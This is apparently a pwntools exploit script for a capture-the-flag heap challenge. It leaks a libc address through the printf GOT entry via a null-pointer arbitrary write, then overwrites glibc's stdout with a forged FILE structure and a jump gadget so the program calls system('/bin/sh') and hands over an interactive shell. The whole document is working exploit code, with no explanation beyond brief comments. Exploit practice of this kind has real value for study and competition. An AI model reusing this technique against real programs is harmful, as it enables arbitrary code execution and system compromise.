from pwn import *

r = process("ulimit -Sv 1000000; ./chall_patched", shell=True)
context.binary = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")

r.sendline(b'-1\n') # allocate a size such that calloc fails and returns null. read does not segfault so its fine if calloc returns null.

def write(offset, data):
    r.sendline(b'1')
    r.sendline(str(offset).encode())
    r.send(data)
    sleep(0.1)

def read():
    r.sendline(b'2')

bookAddr = 0 # since calloc returns null we know the address of the book
write(exe.symbols['book'], p64(exe.got['printf'])) # modify the address so it points to printf GOT
bookAddr = exe.got['printf']

read()
r.recvuntil(b'Here is your book: ')
libc.address = libc_leak = int.from_bytes(r.recvline()[:-1], 'little') - libc.symbols['printf']
print(hex(libc_leak))

write(exe.symbols['book'] - bookAddr, p64(libc.address)) # make book point to libc
bookAddr = libc.address


stdout_lock = libc.symbols['_IO_stdfile_1_lock'] 
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18

# our gadget
gadget = libc.address + 0x00000000001724f0 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
# write the fake Filestructure to stdout
write(libc.sym['_IO_2_1_stdout_'] - bookAddr, bytes(fake))

# yay got shell
r.interactive()
